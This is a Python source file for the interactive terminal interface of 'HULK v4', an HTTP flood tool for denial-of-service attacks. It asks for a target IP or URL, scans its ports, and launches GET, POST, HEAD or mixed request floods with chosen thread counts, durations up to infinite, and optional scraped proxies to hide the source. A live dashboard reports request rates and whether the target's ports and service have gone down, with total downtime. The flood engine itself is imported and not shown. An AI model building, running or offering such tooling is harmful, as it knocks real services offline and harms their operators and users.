#!/usr/bin/env python3

"""
HULK v4 — Server-Side Terminal UI
Port scanning, target health monitoring, live attack dashboard.
"""

import asyncio
import locale
import os
import sys
import threading
import time
from typing import List, Optional
from urllib.parse import urlparse

os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import uvicorn
from rich.align import Align
from rich.console import Console, Group
from rich.live import Live
from rich.markup import escape
from rich.panel import Panel
from rich.prompt import Confirm, IntPrompt, Prompt
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

from api import app
from attack_engine import engine
from config import settings
from models import AttackMethod, AttackStats, AttackStatus, PortStatus
from proxy_pool import proxy_pool
from proxy_scraper import scrape_proxies, save_proxies
from scanner import scan_ports
from target_monitor import monitor


console = Console()

BANNER = r"""
[bold green]
  ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗
  ██║  ██║██║   ██║██║     ██║ ██╔╝
  ███████║██║   ██║██║     █████╔╝
  ██╔══██║██║   ██║██║     ██╔═██╗
  ██║  ██║╚██████╔╝███████╗██║  ██╗
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
[/bold green]
[dim]  --- Server Edition v4.0 ---[/dim]
"""

MENU = {"1": "Launch Attack", "2": "Stop Attack", "3": "Live Dashboard",
        "4": "Scrape Proxies", "5": "Port Scan", "6": "Settings", "0": "Exit"}


def clear():
    os.system("cls" if os.name == "nt" else "clear")


# ── Dashboard panels ──────────────────────────────────────────────────

def _status_display(s):
    m = {AttackStatus.IDLE: ("--", "dim", "IDLE"), AttackStatus.RUNNING: (">>", "bold green", "RUNNING"),
         AttackStatus.STOPPING: ("..", "bold yellow", "STOPPING"), AttackStatus.FINISHED: ("OK", "bold cyan", "FINISHED"),
         AttackStatus.ALL_DOWN: ("!!", "bold red", "ALL PORTS DOWN"), AttackStatus.ERROR: ("XX", "bold red", "ERROR")}
    return m.get(s, ("?", "white", s.value))

def _port_icon(s):
    m = {PortStatus.ALIVE: ("[green]ALIVE[/]",), PortStatus.DOWN: ("[red]DOWN[/]",),
         PortStatus.PROTECTED: ("[magenta]SHIELD[/]",), PortStatus.SKIPPED: ("[dim]SKIP[/]",)}
    return m.get(s, ("[white]?[/]",))[0]


def panel_overview(stats):
    _, color, label = _status_display(stats.status)
    g = Table.grid(padding=(0, 3))
    g.add_column(justify="right", style="bold cyan", min_width=16)
    g.add_column(justify="left", min_width=30)
    g.add_row("Target", f"[bold white]{escape(stats.target or '-')}[/]")
    g.add_row("Status", f"[{color}]{label}[/]")
    g.add_row("Method", f"[yellow]{stats.method or '-'}[/]")
    g.add_row("Threads", f"[white]{stats.threads}[/]")
    g.add_row("", "")
    g.add_row("Total Requests", f"[bold white]{stats.total_requests:,}[/]")
    g.add_row("Successful", f"[green]{stats.successful:,}[/]")
    g.add_row("Failed", f"[red]{stats.failed:,}[/]")
    rate = f"{stats.requests_per_second:,.1f}"
    g.add_row("Req/sec", f"[bold yellow]{rate}[/]")
    g.add_row("Elapsed", f"[dim]{stats.elapsed:.1f}s[/]")
    if stats.proxies_loaded > 0:
        g.add_row("Proxies alive", f"[green]{proxy_pool.alive_count:,}[/] / [dim]{proxy_pool.count:,}[/]")
        g.add_row("Proxies dead", f"[red]{proxy_pool.dead_count:,}[/]")
    return Panel(Align.center(g), title="[bold white]Attack Overview[/]",
                 border_style="green" if stats.status == AttackStatus.RUNNING else "dim", padding=(1, 2))


def panel_health():
    h = monitor.health
    g = Table.grid(padding=(0, 3))
    g.add_column(justify="right", style="bold cyan", min_width=16)
    g.add_column(justify="left", min_width=30)

    if h.ping_ms > 0:
        ping_color = "green" if h.ping_ms < 100 else "yellow" if h.ping_ms < 500 else "red"
        g.add_row("TCP Ping", f"[{ping_color}]{h.ping_ms:.0f} ms[/]")
    else:
        g.add_row("TCP Ping", "[red]TIMEOUT[/]")

    if h.http_latency_ms > 0:
        lat_color = "green" if h.http_latency_ms < 200 else "yellow" if h.http_latency_ms < 1000 else "red"
        g.add_row("HTTP Latency", f"[{lat_color}]{h.http_latency_ms:.0f} ms[/]")
    else:
        g.add_row("HTTP Latency", "[red]TIMEOUT[/]")

    g.add_row("Available", "[green]YES[/]" if h.available else "[bold red]NO - TARGET DOWN[/]")

    if h.avg_latency_ms > 0:
        g.add_row("Avg Latency", f"[white]{h.avg_latency_ms:.0f} ms[/]")
        g.add_row("Peak Latency", f"[yellow]{h.peak_latency_ms:.0f} ms[/]")

    if h.degraded:
        g.add_row("Condition", "[bold yellow]DEGRADED (2x+ baseline)[/]")
    elif not h.available:
        g.add_row("Condition", "[bold red]OFFLINE[/]")
    else:
        g.add_row("Condition", "[green]NORMAL[/]")

    if h.total_downtime > 0 or h.downtime_start > 0:
        dt = h.total_downtime
        if h.downtime_start > 0:
            dt += time.time() - h.downtime_start
        g.add_row("Total Downtime", f"[red]{dt:.1f}s[/]")

    if h.checks_total > 0:
        fail_pct = (h.checks_failed / h.checks_total) * 100
        g.add_row("Checks Failed", f"[red]{h.checks_failed}[/] / {h.checks_total} ([red]{fail_pct:.0f}%[/])")

    return Panel(Align.center(g), title="[bold white]Target Health[/]",
                 border_style="red" if not h.available else "yellow" if h.degraded else "green", padding=(1, 2))


def panel_ports(stats):
    t = Table(show_header=True, header_style="bold cyan", expand=True)
    t.add_column("Port", justify="center", width=7)
    t.add_column("Status", justify="center", width=12)
    t.add_column("Reqs", justify="right", width=10)
    t.add_column("OK", justify="right", width=10, style="green")
    t.add_column("Fail", justify="right", width=10, style="red")
    t.add_column("Streak", justify="right", width=8)
    t.add_column("Top Codes", ratio=1)

    for port in sorted(stats.ports.keys()):
        ps = stats.ports[port]
        codes = sorted(ps.status_codes.items(), key=lambda x: -x[1])[:4]
        codes_str = "  ".join(f"[{'green' if c < 400 else 'yellow' if c < 500 else 'red'}]{c}[/]:{n}" for c, n in codes) or "[dim]-[/]"
        streak_s = "red" if ps.consecutive_fails > 20 else "yellow" if ps.consecutive_fails > 5 else "dim"
        t.add_row(f"[bold]{port}[/]", _port_icon(ps.status), f"{ps.total_requests:,}",
                  f"{ps.successful:,}", f"{ps.failed:,}", f"[{streak_s}]{ps.consecutive_fails}[/]", codes_str)

    alive = len(stats.alive_ports)
    down = len(stats.down_ports)
    return Panel(Group(t, Align.center(Text.from_markup(f"[green]{alive} alive[/] | [red]{down} down[/] | {len(stats.ports)} total"))),
                 title="[bold white]Port Status[/]", border_style="cyan", padding=(1, 1))


def build_dashboard(stats):
    parts = [panel_overview(stats)]
    if monitor.is_running:
        parts.append(panel_health())
    parts.append(panel_ports(stats))
    parts.append(Align.center(Text.from_markup(
        f"  [bold yellow][Ctrl+C][/] [dim]Back to menu[/]  |  "
        f"[dim]API:[/] [bold cyan]http://{settings.host}:{settings.api_port}[/]")))
    return Group(*parts)


# ── Prompts ────────────────────────────────────────────────────────────

def prompt_target():
    console.print()
    console.print(Rule("[bold cyan]Target Configuration[/]"))
    t = Prompt.ask("[bold yellow]Enter target IP or URL[/]", console=console)
    if not t:
        return None
    t = t.strip()
    if not t.startswith(("http://", "https://")):
        t = "https://" + t
    return t


async def prompt_ports(target):
    console.print()
    console.print("[bold cyan]Scanning ports on target...[/]")
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]

    with console.status("[bold green]Scanning 50+ ports...[/]", spinner="dots"):
        results = await scan_ports(host)

    if not results:
        console.print("[red]No open ports found. Using defaults 443, 8080, 8443.[/]")
        return [443, 8080, 8443]

    # Show scan results
    t = Table(show_header=True, header_style="bold cyan", title="Scan Results")
    t.add_column("#", justify="center", width=4)
    t.add_column("Port", justify="center", width=8)
    t.add_column("TCP", justify="center", width=6)
    t.add_column("HTTP", justify="center", width=8)
    t.add_column("Status", justify="center", width=8)
    t.add_column("Latency", justify="right", width=10)

    http_ports = []
    for i, r in enumerate(results):
        tcp_s = "[green]OPEN[/]" if r["tcp_open"] else "[red]CLOSED[/]"
        http_s = "[green]YES[/]" if r["http_ok"] else "[dim]NO[/]"
        code = str(r["status"]) if r["status"] else "-"
        lat = f"{r['latency_ms']:.0f}ms" if r["latency_ms"] > 0 else "-"
        t.add_row(str(i + 1), str(r["port"]), tcp_s, http_s, code, lat)
        if r["http_ok"]:
            http_ports.append(r["port"])

    console.print(t)

    if http_ports:
        default_str = ", ".join(str(p) for p in http_ports[:8])
        console.print(f"\n[green]HTTP-responsive ports: {default_str}[/]")
    else:
        # TCP-open but no HTTP — use those
        tcp_ports = [r["port"] for r in results if r["tcp_open"]]
        default_str = ", ".join(str(p) for p in tcp_ports[:8])
        console.print(f"\n[yellow]TCP-open ports (no HTTP): {default_str}[/]")

    raw = Prompt.ask("[bold yellow]Ports to attack[/] [dim](comma-sep, Enter for auto)[/]",
                     default=default_str, console=console)

    ports = []
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if chunk.isdigit():
            ports.append(int(chunk))
    return ports if ports else [443]


def prompt_method():
    console.print()
    t = Table(show_header=False, box=None, padding=(0, 2))
    t.add_column(justify="center", style="bold yellow", width=4)
    t.add_column()
    t.add_row("1", "[white]GET[/]   - standard flood")
    t.add_row("2", "[white]POST[/]  - payload flood")
    t.add_row("3", "[white]HEAD[/]  - lightweight probe")
    t.add_row("4", "[white]MIX[/]   - random rotation [dim](recommended)[/]")
    console.print(Panel(t, title="[bold]Attack Method[/]", border_style="yellow", padding=(1, 2)))
    c = Prompt.ask("[bold yellow]Method[/]", choices=["1", "2", "3", "4"], default="4", console=console)
    return {"1": AttackMethod.GET, "2": AttackMethod.POST, "3": AttackMethod.HEAD, "4": AttackMethod.MIX}[c]


# ── Actions ────────────────────────────────────────────────────────────

async def do_attack():
    target = prompt_target()
    if not target:
        console.print("[red]No target.[/]")
        return

    ports = await prompt_ports(target)
    method = prompt_method()
    threads = IntPrompt.ask("[bold yellow]Threads[/]", default=settings.default_threads, console=console)
    duration = IntPrompt.ask("[bold yellow]Duration (sec, 0=infinite)[/]", default=0, console=console)

    use_proxies = False
    if proxy_pool.count > 0:
        use_proxies = Confirm.ask(f"[bold yellow]Use proxies? ({proxy_pool.alive_count} alive)[/]", default=True, console=console)

    console.print()
    console.print(Rule("[bold green]Launch[/]"))
    s = Table.grid(padding=(0, 2))
    s.add_column(style="bold cyan", justify="right")
    s.add_column(style="white")
    s.add_row("Target", target)
    s.add_row("Ports", ", ".join(str(p) for p in ports))
    s.add_row("Method", method.value)
    s.add_row("Threads", str(threads))
    s.add_row("Duration", f"{duration}s" if duration else "infinite")
    s.add_row("Proxies", f"{proxy_pool.alive_count}" if use_proxies else "off")
    console.print(Panel(s, border_style="green", padding=(1, 2)))

    if not Confirm.ask("[bold yellow]Confirm?[/]", console=console):
        console.print("[dim]Cancelled.[/]")
        return

    await engine.start(target, ports, method, threads, duration, use_proxies)
    console.print("[bold green]Attack launched![/]")
    await asyncio.sleep(1)
    await do_dashboard()


async def do_stop():
    if not engine.is_running:
        console.print("[yellow]Nothing running.[/]")
        return
    console.print("[yellow]Stopping...[/]")
    await engine.stop()
    console.print("[green]Stopped.[/]")


async def do_dashboard():
    console.print("\n[dim]Live dashboard - Ctrl+C to return[/]\n")
    try:
        with Live(console=console, refresh_per_second=4, screen=False) as live:
            idle = 0
            while True:
                stats = engine.stats.snapshot()
                dash = build_dashboard(stats)
                if engine.last_error:
                    dash = Group(dash, Align.center(Text.from_markup(f"[bold red]{engine.last_error}[/]")))
                live.update(dash)
                await asyncio.sleep(0.25)
                if stats.status in (AttackStatus.FINISHED, AttackStatus.ALL_DOWN, AttackStatus.ERROR) and not engine.is_running:
                    idle += 1
                    if idle > 20:
                        break
                else:
                    idle = 0
    except KeyboardInterrupt:
        pass


async def do_scrape():
    console.print("\n[bold cyan]Scraping proxies...[/]")
    with console.status("[bold green]Scraping 15+ sources...[/]", spinner="dots"):
        proxies = await scrape_proxies(check=False)
    if not proxies:
        console.print("[red]No proxies found.[/]")
        return
    save_proxies(proxies, "proxies.txt")
    count = proxy_pool.load_file("proxies.txt")
    console.print(f"[bold green]Scraped {len(proxies)}, loaded {count} proxies.[/]")


async def do_scan():
    target = Prompt.ask("[bold yellow]Target IP/host to scan[/]", console=console)
    if not target:
        return
    host = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    console.print(f"[bold cyan]Scanning {host}...[/]")
    with console.status("[bold green]Scanning...[/]", spinner="dots"):
        results = await scan_ports(host)
    if not results:
        console.print("[red]No open ports.[/]")
        return
    t = Table(show_header=True, header_style="bold cyan", title=f"Open ports on {host}")
    t.add_column("Port", justify="center", width=8)
    t.add_column("TCP", justify="center", width=8)
    t.add_column("HTTP", justify="center", width=8)
    t.add_column("Status", justify="center", width=8)
    t.add_column("Latency", justify="right", width=10)
    for r in results:
        t.add_row(str(r["port"]), "[green]OPEN[/]" if r["tcp_open"] else "[red]--[/]",
                  "[green]YES[/]" if r["http_ok"] else "[dim]NO[/]",
                  str(r["status"]) if r["status"] else "-",
                  f"{r['latency_ms']:.0f}ms" if r["latency_ms"] > 0 else "-")
    console.print(t)


def do_settings():
    console.print()
    t = Table(title="Settings", show_header=True, header_style="bold cyan")
    t.add_column("Setting", style="bold white")
    t.add_column("Value", style="yellow")
    t.add_row("API", f"{settings.host}:{settings.api_port}")
    t.add_row("Threads", str(settings.default_threads))
    t.add_row("Max Threads", str(settings.max_threads))
    t.add_row("Timeout", f"{settings.request_timeout}s")
    t.add_row("Proxy Timeout", f"{settings.proxy_timeout}s")
    t.add_row("Proxies", f"{proxy_pool.alive_count} alive / {proxy_pool.count} total")
    console.print(t)


def show_menu():
    console.print()
    t = Table(show_header=False, box=None, padding=(0, 3))
    t.add_column(justify="center", style="bold green", width=4)
    t.add_column(style="white")
    r = engine.is_running
    for k, v in MENU.items():
        if k == "2" and not r:
            t.add_row(f"[dim]{k}[/]", f"[dim]{v}[/]")
        elif k == "1" and r:
            t.add_row(f"[dim]{k}[/]", f"[dim]{v} (running)[/]")
        else:
            t.add_row(k, v)

    if r:
        s = engine.stats.snapshot()
        line = (f"[bold green]ACTIVE[/] -> [white]{s.target}[/] | "
                f"[yellow]{s.total_requests:,} reqs[/] | "
                f"[cyan]{s.requests_per_second:.0f} r/s[/] | "
                f"[green]{len(s.alive_ports)} alive[/] [red]{len(s.down_ports)} down[/]")
    else:
        line = "[dim]No active attack[/]"

    console.print(Panel(Group(Align.center(Text.from_markup(line)), t),
                        title="[bold white]HULK[/]", border_style="green", padding=(1, 2)))


def start_api():
    cfg = uvicorn.Config(app, host=settings.host, port=settings.api_port, log_level="error")
    srv = uvicorn.Server(cfg)
    threading.Thread(target=srv.run, daemon=True).start()


async def main_loop():
    clear()
    console.print(BANNER)
    start_api()
    await asyncio.sleep(0.3)
    console.print(f"[green]API -> http://{settings.host}:{settings.api_port}[/]")

    if settings.proxy_file:
        n = proxy_pool.load_file(settings.proxy_file)
        console.print(f"[magenta]Loaded {n} proxies[/]")

    while True:
        try:
            show_menu()
            c = Prompt.ask("[bold green]>[/]", choices=list(MENU.keys()), console=console)
            if c == "1":
                if engine.is_running:
                    console.print("[yellow]Already running.[/]")
                else:
                    await do_attack()
            elif c == "2":
                await do_stop()
            elif c == "3":
                await do_dashboard()
            elif c == "4":
                await do_scrape()
            elif c == "5":
                await do_scan()
            elif c == "6":
                do_settings()
            elif c == "0":
                if engine.is_running:
                    if Confirm.ask("[yellow]Stop and exit?[/]", console=console):
                        await engine.stop()
                    else:
                        continue
                console.print("[bold green]Goodbye.[/]")
                break
        except KeyboardInterrupt:
            console.print()
        except EOFError:
            break


def run():
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        console.print("\n[bold green]Goodbye.[/]")


if __name__ == "__main__":
    run()
